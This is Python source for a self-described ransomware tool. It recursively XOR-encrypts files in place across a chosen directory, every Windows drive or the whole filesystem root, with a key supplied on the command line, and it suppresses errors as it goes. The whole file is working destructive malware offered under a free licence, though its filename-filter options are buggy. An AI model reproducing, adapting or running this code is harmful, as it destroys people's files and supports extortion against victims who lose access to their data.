#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file implement a ransomware. """

###################
#    This file implement a ransomware.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

from base64 import b85decode, b64decode, b32decode, b16decode
from os import getcwd, path, scandir
from argparse import ArgumentParser
from string import ascii_uppercase
from typing import Callable
from hashlib import sha512
from time import sleep
from re import match
import platform


def crypt(key: bytes, data: bytes) -> bytes:

    """ This fonction xor data with key. """

    cipher = []
    key_lenght = len(key)
    for i, car in enumerate(data):
        cipher.append(car ^ key[i % key_lenght])

    return bytes(cipher)


def get_sha512(filename: str) -> bytes:

    """ This function make an IV from filename. """

    return sha512(filename.encode()).digest()


class RansomWare:

    """ This class can encrypt files. """

    def __init__(
        self,
        key: bytes,
        function_encrypt: Callable = crypt,
        function_IV: Callable = get_sha512,
        directory: str = getcwd(),
        timeBetweenCrypt: float = 0,
        regexs_filename_to_encrypt: list = [],
        regexs_filename_dont_encrypt: list = [],
    ):
        self.key = key
        self.crypt = function_encrypt
        self.function_IV = function_IV
        self.directory = directory
        self.timeBetweenCrypt = timeBetweenCrypt

    def launch(self) -> None:

        """ This function launch the CryptoLocker. """

        self.encrypt_files(self.directory)

    def encrypt_files(self, directory: str) -> None:

        """ This function get recursive filenames and crypt files. """

        for file in scandir(directory):
            complete_name = path.join(directory, file.name)

            if file.is_dir():
                try:
                    self.encrypt_files(complete_name)
                except Exception:
                    pass

            elif file.is_file():
                iv = self.function_IV(file.name)
                final_key = self.crypt(iv, self.key)

                try:
                    self.encrypt_file(complete_name, final_key)
                except Exception:
                    pass

    def encrypt_file(self, filename: str, key: bytes) -> None:

        """ This function encrypt one file. """

        if self.regexs_filename_dont_encrypt:
            for regex in self.regexs_filename_dont_encrypt:
                result = match(regex, filename)
                if result:
                    return

        if self.regexs_filename_to_encrypt:
            for regex in self.regexs_filename_dont_encrypt:
                result = match(regex, filename)
                if result:
                    break
            if not result:
                return

        with open(filename, "rb") as file:
            data = file.read()

        data = self.crypt(key, data)

        with open(filename, "wb") as file:
            file.write(data)

        sleep(self.timeBetweenCrypt)


def parse() -> ArgumentParser:

    """ This function parse arguments. """

    args = ArgumentParser()
    args.add_argument("key", help="Key to encrypt files.")
    args.add_argument(
        "--all", "-a", help="Encrypt all files.", default=None, action="store_true"
    )
    args.add_argument(
        "--encode-key",
        "-e",
        help="Encode key with bases 16, 32, 64 or 85.",
        choices=["16", "32", "64", "85"],
        default=None,
    )
    args.add_argument("--directory", "-d", help="Directory to encrypt.", default=None)
    args.add_argument(
        "--time-between-enrypt",
        "-t",
        help="Time between encrypt files.",
        type=int,
        default=0,
    )
    return args


def main() -> None:
    args = parse().parse_args()

    if args.encode_key is None:
        key = args.key.encode()
    elif args.encode_key == "16":
        key = b16decode(args.key.encode())
    elif args.encode_key == "32":
        key = b32decode(args.key.encode())
    elif args.encode_key == "64":
        key = b64decode(args.key.encode())
    elif args.encode_key == "85":
        key = b85decode(args.key.encode())

    directory = args.directory

    if platform.system() == "Windows" and args.all:
        for maj in ascii_uppercase:
            directory = f"{maj}:\\"

            try:
                RansomWare(
                    key,
                    directory=directory or getcwd(),
                    timeBetweenCrypt=args.time_between_enrypt,
                ).launch()
            except Exception:
                pass

        exit(0)
    elif args.all:
        directory = "/"

    RansomWare(
        key, directory=directory or getcwd(), timeBetweenCrypt=args.time_between_enrypt
    ).launch()


if __name__ == "__main__":
    main()
